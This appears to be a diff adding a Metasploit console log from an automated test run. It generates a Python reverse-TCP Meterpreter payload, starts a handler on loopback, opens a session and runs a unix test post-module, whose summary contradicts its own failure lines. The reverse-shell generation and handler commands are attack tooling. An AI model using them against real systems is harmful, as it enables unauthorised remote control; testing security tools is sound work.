@@ -1,0 +1,24 @@
+use python/meterpreter_reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-1876-1iuy1kr.py -f raw MeterpreterTryToFork=false lport=6011 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 115725 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-1876-1iuy1kr.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 10
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6011 
+[*] Meterpreter session 11 opened (127.0.0.1:6011 -> 127.0.0.1:50066 ) at 2022-01-19 00:54:21 +0000
+use test/unix
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> run session=11 addentropy=true verbose=true
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: windows
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 11
+[*] Session type is meterpreter and platform is windows
+[-] Failed to open file: : core_channel_open: Operation failed: Python exception: FileNotFoundError
+[-] FAILED: should list users
+[-] Exception: NoMethodError : undefined method `split' for nil:NilClass
+[*] Testing complete in 0.0455923
+[*] Passed: 1; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> 
